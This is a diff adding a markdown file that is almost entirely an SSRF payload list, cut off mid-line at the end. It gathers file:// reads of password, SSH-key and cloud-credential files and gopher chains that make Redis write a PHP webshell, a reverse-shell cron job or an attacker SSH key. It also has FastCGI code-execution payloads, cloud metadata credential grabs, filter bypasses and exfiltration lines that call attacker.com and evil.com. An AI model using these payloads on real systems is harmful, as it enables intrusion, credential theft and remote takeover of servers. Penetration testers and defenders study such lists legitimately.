@@ -1,0 +1,530 @@
+# Complete SSRF Payload Collection with Blind SSRF, File Reading & RCE
+
+```bash
+# =============================================================================
+# BASIC HTTP SSRF PAYLOADS
+# =============================================================================
+
+# Standard HTTP requests
+http://127.0.0.1
+http://localhost
+http://0.0.0.0
+http://10.10.14.1
+http://192.168.1.1
+
+# Different ports
+http://127.0.0.1:80
+http://127.0.0.1:8080
+http://127.0.0.1:3000
+http://127.0.0.1:5000
+http://127.0.0.1:8000
+http://127.0.0.1:9000
+http://127.0.0.1:22
+http://127.0.0.1:21
+http://127.0.0.1:25
+http://127.0.0.1:443
+http://127.0.0.1:993
+http://127.0.0.1:995
+
+# HTTP with paths
+http://127.0.0.1/admin
+http://127.0.0.1/server-status
+http://127.0.0.1/server-info
+http://127.0.0.1/.env
+http://127.0.0.1/config
+http://127.0.0.1/api
+http://127.0.0.1/v1/api
+
+# HTTPS variants
+https://127.0.0.1
+https://localhost
+https://internal.company.com
+
+# =============================================================================
+# FILE PROTOCOL SSRF PAYLOADS - CREDENTIAL & CONFIG FILES
+# =============================================================================
+
+# Linux credential files
+file:///etc/passwd
+file:///etc/shadow
+file:///etc/group
+file:///etc/sudoers
+file:///root/.ssh/id_rsa
+file:///root/.ssh/id_rsa.pub
+file:///root/.ssh/authorized_keys
+file:///root/.ssh/known_hosts
+file:///home/user/.ssh/id_rsa
+file:///home/user/.ssh/id_rsa.pub
+file:///home/user/.ssh/authorized_keys
+
+# Windows credential files
+file:///C:/Windows/System32/config/SAM
+file:///C:/Windows/System32/config/SYSTEM
+file:///C:/Windows/System32/config/SECURITY
+file:///C:/Users/Administrator/.ssh/id_rsa
+file:///C:/Users/Administrator/Desktop/credentials.txt
+file:///C:/Windows/Panther/Unattend.xml
+file:///C:/Windows/System32/sysprep/sysprep.xml
+
+# Database configuration files
+file:///var/www/html/config.php
+file:///var/www/html/wp-config.php
+file:///var/www/html/.env
+file:///var/www/html/database.php
+file:///var/www/html/db_config.php
+file:///etc/mysql/my.cnf
+file:///etc/mysql/mysql.conf.d/mysqld.cnf
+file:///etc/postgresql/postgresql.conf
+file:///var/lib/pgsql/data/pg_hba.conf
+
+# Web server configurations
+file:///etc/apache2/apache2.conf
+file:///etc/apache2/sites-enabled/000-default.conf
+file:///etc/apache2/.htpasswd
+file:///etc/nginx/nginx.conf
+file:///etc/nginx/sites-enabled/default
+file:///usr/local/etc/apache2/httpd.conf
+file:///var/www/html/.htaccess
+
+# Application-specific configs
+file:///opt/tomcat/conf/tomcat-users.xml
+file:///opt/tomcat/conf/server.xml
+file:///etc/rabbitmq/rabbitmq.conf
+file:///etc/redis/redis.conf
+file:///etc/mongodb.conf
+file:///etc/elasticsearch/elasticsearch.yml
+
+# System files
+file:///etc/hosts
+file:///etc/hostname
+file:///etc/resolv.conf
+file:///etc/issue
+file:///proc/version
+file:///proc/cmdline
+file:///proc/mounts
+file:///proc/net/arp
+file:///proc/net/route
+file:///proc/net/tcp
+file:///proc/net/udp
+file:///proc/self/environ
+
+# Log files with potential credentials
+file:///var/log/apache2/access.log
+file:///var/log/apache2/error.log
+file:///var/log/nginx/access.log
+file:///var/log/nginx/error.log
+file:///var/log/auth.log
+file:///var/log/syslog
+file:///var/log/messages
+file:///var/log/secure
+file:///var/log/mysql/error.log
+file:///var/log/postgresql/postgresql.log
+
+# History files
+file:///root/.bash_history
+file:///root/.mysql_history
+file:///home/user/.bash_history
+file:///home/user/.mysql_history
+file:///home/user/.psql_history
+
+# Cloud provider credential files
+file:///root/.aws/credentials
+file:///root/.aws/config
+file:///home/user/.aws/credentials
+file:///home/user/.aws/config
+file:///root/.azure/credentials
+file:///root/.config/gcloud/credentials.db
+
+# =============================================================================
+# GOPHER PROTOCOL SSRF PAYLOADS - RCE & CREDENTIAL EXTRACTION
+# =============================================================================
+
+# HTTP requests via Gopher
+gopher://127.0.0.1:80/_GET / HTTP/1.1%0D%0AHost: 127.0.0.1%0D%0A%0D%0A
+gopher://127.0.0.1:80/_GET /admin HTTP/1.1%0D%0AHost: 127.0.0.1%0D%0A%0D%0A
+gopher://127.0.0.1:80/_POST /login HTTP/1.1%0D%0AHost: 127.0.0.1%0D%0AContent-Type: application/x-www-form-urlencoded%0D%0AContent-Length: 25%0D%0A%0D%0Ausername=admin&password=admin
+
+# MySQL credential extraction via Gopher (Port 3306)
+gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00mysql_native_password%00
+gopher://127.0.0.1:3306/_%20%00%00%01%85%a2%20%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00
+
+# Redis RCE via Gopher (Port 6379) - Webshell Creation
+gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
+gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$56%0d%0a%0d%0a%0a<?php system($_GET['cmd']); ?>%0a%0a%0d%0a
+gopher://127.0.0.1:6379/_*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a
+gopher://127.0.0.1:6379/_*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a
+gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0asave%0d%0a
+
+# Redis RCE via Gopher - Cron Job for Reverse Shell
+gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/10.10.14.1/4444 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
+
+# Redis RCE via Gopher - SSH Key Installation
+gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$400%0d%0a%0d%0a%0a%0assh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...YOUR_PUBLIC_KEY...%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
+
+# SMTP credential harvesting via Gopher (Port 25)
+gopher://127.0.0.1:25/_EHLO test%0d%0aAUTH PLAIN%0d%0a
+gopher://127.0.0.1:25/_EHLO test%0d%0aMAIL FROM: admin@test.com%0d%0aRCPT TO: victim@target.com%0d%0aDATA%0d%0aSubject: Credential Harvest%0d%0a%0d%0aSSRF Test%0d%0a.%0d%0aQUIT%0d%0a
+
+# PostgreSQL RCE via Gopher (Port 5432)
+gopher://127.0.0.1:5432/_%00%00%00%08%04%d2%16%2f
+
+# Memcached data extraction via Gopher (Port 11211)
+gopher://127.0.0.1:11211/_stats%0d%0a
+gopher://127.0.0.1:11211/_stats items%0d%0a
+gopher://127.0.0.1:11211/_stats cachedump 1 0%0d%0a
+gopher://127.0.0.1:11211/_get sensitive_key%0d%0a
+
+# FastCGI RCE via Gopher (Port 9000)
+gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%8F%00%00%0E%03REQUEST_METHODGET%0F%08SERVER_PROTOCOLhttp/1.1%0B%09SCRIPT_NAME/index.php%0C%14DOCUMENT_ROOT/var/www/html%11%09SCRIPT_FILENAME/var/www/html/index.php%0F%17REQUEST_URI/?cmd=system('id')%01%04%00%01%00%00%00%00
+
+# =============================================================================
+# DICT PROTOCOL SSRF PAYLOADS
+# =============================================================================
+
+# Basic dict queries
+dict://127.0.0.1:2628/
+dict://localhost:2628/
+dict://127.0.0.1:2628/SHOW:DB
+dict://127.0.0.1:2628/SHOW:SERVER
+
+# Dict to probe other services
+dict://127.0.0.1:22/
+dict://127.0.0.1:80/
+dict://127.0.0.1:3306/
+dict://127.0.0.1:6379/
+dict://127.0.0.1:5432/
+dict://127.0.0.1:1433/
+
+# Dict for service fingerprinting
+dict://127.0.0.1:21/help
+dict://127.0.0.1:25/help
+dict://127.0.0.1:110/help
+
+# =============================================================================
+# LDAP PROTOCOL SSRF PAYLOADS
+# =============================================================================
+
+# Basic LDAP queries
+ldap://127.0.0.1:389/
+ldap://localhost:389/
+ldap://127.0.0.1:636/
+ldaps://127.0.0.1:636/
+
+# LDAP credential enumeration
+ldap://127.0.0.1:389/dc=example,dc=com?cn?sub?(cn=*)
+ldap://127.0.0.1:389/cn=users,dc=example,dc=com?userPassword?sub?(objectClass=*)
+ldap://127.0.0.1:389/cn=admin,dc=example,dc=com
+
+# =============================================================================
+# FTP PROTOCOL SSRF PAYLOADS
+# =============================================================================
+
+# Basic FTP connections
+ftp://127.0.0.1/
+ftp://localhost/
+ftp://127.0.0.1:21/
+ftp://anonymous:anonymous@127.0.0.1/
+
+# FTP with credentials
+ftp://admin:admin@127.0.0.1/
+ftp://user:pass@127.0.0.1/
+ftp://guest:guest@127.0.0.1/
+ftp://root:root@127.0.0.1/
+
+# FTP directory traversal for file access
+ftp://127.0.0.1/../../../etc/passwd
+ftp://127.0.0.1/../../etc/shadow
+ftp://127.0.0.1/../../../root/.ssh/id_rsa
+
+# =============================================================================
+# TFTP PROTOCOL SSRF PAYLOADS
+# =============================================================================
+
+# TFTP file access
+tftp://127.0.0.1/etc/passwd
+tftp://127.0.0.1/boot.ini
+tftp://127.0.0.1/config.txt
+tftp://127.0.0.1/../../../etc/shadow
+
+# =============================================================================
+# CLOUD METADATA SSRF PAYLOADS - CREDENTIAL EXTRACTION
+# =============================================================================
+
+# AWS EC2 Instance Metadata - Credential Harvesting
+http://169.254.169.254/
+http://169.254.169.254/latest/
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/instance-id
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/public-ipv4
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data/
+http://169.254.169.254/latest/dynamic/instance-identity/document
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]
+
+# AWS IMDSv2 Token-based access
+# curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
+http://169.254.169.254/latest/meta-data/
+
+# Google Cloud Platform - Credential Extraction
+http://metadata.google.internal/
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script
+
+# Azure Instance Metadata - Credential Access
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text
+
+# DigitalOcean Metadata
+http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1/hostname
+http://169.254.169.254/metadata/v1/user-data
+http://169.254.169.254/metadata/v1/public-keys
+http://169.254.169.254/metadata/v1/region
+http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/address
+
+# =============================================================================
+# BLIND SSRF DETECTION PAYLOADS
+# =============================================================================
+
+# DNS-based blind SSRF detection
+http://burp-collaborator-subdomain.burpcollaborator.net/
+http://ssrf-test.burpcollaborator.net/
+http://127.0.0.1.ssrf-test.burpcollaborator.net/
+http://ssrf.$(whoami).burpcollaborator.net/
+
+# HTTP callback detection
+http://webhook.site/unique-token
+http://requestbin.net/r/unique-token
+http://pipedream.com/r/unique-token
+
+# Custom DNS exfiltration
+http://ssrf.attacker-domain.com/
+http://127-0-0-1.attacker-domain.com/
+http://internal-service.attacker-domain.com/
+
+# Time-based blind SSRF
+http://httpbin.org/delay/10
+http://127.0.0.1:80/?sleep=10
+http://postman-echo.com/delay/5
+
+# Port knocking for blind detection
+http://127.0.0.1:80/
+http://127.0.0.1:8080/
+http://127.0.0.1:3000/
+http://127.0.0.1:9200/
+http://127.0.0.1:6379/
+
+# Error-based blind SSRF
+http://127.0.0.1:99999/
+http://invalid-host-name.local/
+http://256.256.256.256/
+
+# =============================================================================
+# SSRF TO RCE PAYLOADS - ADVANCED TECHNIQUES
+# =============================================================================
+
+# Redis Complete RCE Chain
+# Step 1: Flush database
+gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
+
+# Step 2: Set webshell content
+gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$96%0d%0a%0d%0a%0a<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>%0a%0a%0d%0a
+
+# Step 3: Set directory to web root
+gopher://127.0.0.1:6379/_*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a
+
+# Step 4: Set filename
+gopher://127.0.0.1:6379/_*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a
+
+# Step 5: Save to disk
+gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0asave%0d%0a
+
+# Step 6: Access webshell at http://target/shell.php?cmd=id
+
+# MySQL UDF RCE (if lib_mysqludf_sys.so available)
+gopher://127.0.0.1:3306/_\x20\x00\x00\x01\x85\xa2\x20\x00\x00\x00\x01\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
+
+# FastCGI PHP Code Execution
+gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%00%00%0E%04REQUEST_METHODPOST%0F%17REQUEST_URI/index.php?cmd=phpinfo()%0C%14DOCUMENT_ROOT/var/www/html%0B%09SCRIPT_NAME/index.php%11%1A/var/www/html/index.php%01%04%00%01%00%00%00%00%01%05%00%01%00%1F%00%00<?php system($_GET['cmd']); ?>%01%05%00%01%00%00%00%00
+
+# Memcached Injection for Session Poisoning
+gopher://127.0.0.1:11211/_set%20sess_admin%200%203600%2050%0d%0ausername|s:5:"admin";role|s:5:"admin";logged|b:1;%0d%0a
+
+# =============================================================================
+# ADVANCED BLIND SSRF TECHNIQUES
+# =============================================================================
+
+# DNS Rebinding Attack
+http://a.127.0.0.1.1time.rebind.network/
+http://a.169.254.169.254.1time.rebind.network/
+
+# Blind SSRF via HTTP redirect chains
+http://redirector.com/redirect?url=http://127.0.0.1:6379/
+
+# Data exfiltration via DNS
+http://$(cat /etc/passwd | base64 | head -c 60).attacker.com/
+http://$(whoami).$(hostname).attacker.com/
+
+# SSRF via IPv6
+http://[::1]/
+http://[::1]:80/
+http://[0:0:0:0:0:ffff:127.0.0.1]/
+
+# SSRF with authentication bypass
+http://user:pass@127.0.0.1/admin
+http://admin:admin@192.168.1.100:8080/manager
+
+# =============================================================================
+# BYPASS TECHNIQUES
+# =============================================================================
+
+# IP Address Obfuscation
+http://0x7f000001/                    # Hex
+http://2130706433/                    # Decimal
+http://017700000001/                  # Octal
+http://0177.0000.0000.0001/          # Mixed
+http://127.000.000.1/                # Zero padding
+
+# Localhost bypasses
+http://localtest.me/
+http://127.0.0.1.nip.io/
+http://127.0.0.1.xip.io/
+http://customer1.app.localhost.my.company.127.0.0.1.nip.io/
+http://mail.ebc.apple.com@127.0.0.1/
+
+# URL encoding bypasses
+http://127.0.0.1/%2e%2e/
+http://%31%32%37%2e%30%2e%30%2e%31/
+http://127.0.0.1%2f%2e%2e%2f
+http://127.0.0.1/%252e%252e/
+
+# Unicode bypasses
+http://127.0.0.1/％2e％2e/
+http://①②⑦.⓪.⓪.①/
+http://127。0。0。1/
+
+# Domain confusion
+http://127.0.0.1.127.0.0.1.nip.io/
+http://127.0.0.1--1.198.252.110.nip.io/
+http://[::1]/
+http://[::]:80/
+http://[0:0:0:0:0:ffff:127.0.0.1]/
+
+# Protocol smuggling
+http://127.0.0.1:80/index.php%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0aGET%20/admin%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a
+
+# CRLF Injection
+http://127.0.0.1:80/test%0d%0aSet-Cookie:%20admin=true
+
+# =============================================================================
+# PORT SCANNING VIA SSRF
+# =============================================================================
+
+# Common service ports
+http://127.0.0.1:21/     # FTP
+http://127.0.0.1:22/     # SSH
+http://127.0.0.1:23/     # Telnet
+http://127.0.0.1:25/     # SMTP
+http://127.0.0.1:53/     # DNS
+http://127.0.0.1:80/     # HTTP
+http://127.0.0.1:110/    # POP3
+http://127.0.0.1:135/    # RPC
+http://127.0.0.1:139/    # NetBIOS
+http://127.0.0.1:143/    # IMAP
+http://127.0.0.1:389/    # LDAP
+http://127.0.0.1:443/    # HTTPS
+http://127.0.0.1:445/    # SMB
+http://127.0.0.1:993/    # IMAPS
+http://127.0.0.1:995/    # POP3S
+http://127.0.0.1:1433/   # MSSQL
+http://127.0.0.1:1521/   # Oracle
+http://127.0.0.1:3306/   # MySQL
+http://127.0.0.1:3389/   # RDP
+http://127.0.0.1:5432/   # PostgreSQL
+http://127.0.0.1:5984/   # CouchDB
+http://127.0.0.1:6379/   # Redis
+http://127.0.0.1:8080/   # Alternative HTTP
+http://127.0.0.1:9200/   # Elasticsearch
+http://127.0.0.1:27017/  # MongoDB
+http://127.0.0.1:11211/  # Memcached
+
+# =============================================================================
+# APPLICATION-SPECIFIC SSRF EXPLOITATION
+# =============================================================================
+
+# Jenkins RCE
+http://127.0.0.1:8080/script
+http://127.0.0.1:8080/computer/(master)/builds
+http://127.0.0.1:8080/systemInfo
+
+# Docker API Exploitation
+http://127.0.0.1:2375/version
+http://127.0.0.1:2376/version
+http://127.0.0.1:2375/containers/json
+http://127.0.0.1:2375/images/json
+
+# Kubernetes API
+http://127.0.0.1:8080/api/
+http://127.0.0.1:8080/api/v1/namespaces
+http://127.0.0.1:8080/api/v1/pods
+http://127.0.0.1:10250/pods
+
+# Consul
+http://127.0.0.1:8500/v1/catalog/services
+http://127.0.0.1:8500/v1/kv/
+http://127.0.0.1:8500/v1/agent/self
+
+# Elasticsearch
+http://127.0.0.1:9200/_cluster/health
+http://127.0.0.1:9200/_cat/indices
+http://127.0.0.1:9200/_nodes
+
+# CouchDB
+http://127.0.0.1:5984/_all_dbs
+http://127.0.0.1:5984/_config
+http://127.0.0.1:5984/_users/_all_docs
+
+# MongoDB
+http://127.0.0.1:27017/
+http://127.0.0.1:28017/
+
+# =============================================================================
+# DATA EXFILTRATION VIA SSRF
+# =============================================================================
+
+# HTTP GET parameter exfiltration
+http://attacker.com/exfil?data=SENSITIVE_DATA
+http://attacker.com/log?passwd=$(cat /etc/passwd | base64)
+
+# HTTP POST data exfiltration
+gopher://attacker.com:80/_POST /exfiltrate HTTP/1.1%0d%0aHost: attacker.com%0d%0aContent-Type: application/x-www-form-urlencoded%0d%0aContent-Length: 100%0d%0a%0d%0adata=SENSITIVE_DATA
+
+# DNS-based data exfiltration
+http://$(cat /etc/passwd | head -1 | cut -d: -f1).attacker.com/
+http://$(hostname).$(whoami).attacker.com/
+
+# SMTP data exfiltration
+gopher://127.0.0.1:25/_EHLO test%0d%0aMAIL FROM: ssrf@target.com%0d%0aRCPT TO: attacker@evil.com%0d%0aDATA%0d%0aSubject: SSRF Data%0d%0a%0d%0a$(cat /etc/passwd)%0d%0a.%0d%0aQUIT%0d%0a
+
+# =============================================================================
+# CONTAINER & ORCHESTRATION SSRF
+# =============================================================================
+
+# Docker socket exploitation
+http://127.0.0.1:2375/containers/json
+http://127.0.0.1:2375/images/json
+http://127.0.0.1:2375/info
+
+# Container metadata services
+http://rancher-metadata.rancher.internal/2015-12-19/self/host/agent_ip
+http://rancher-metadata.rancher.internal/2015-12-19/self/container/name
+http://169.254.169.254/openstack/latest/meta_data.json
+
+# Kubernetes service account
+http
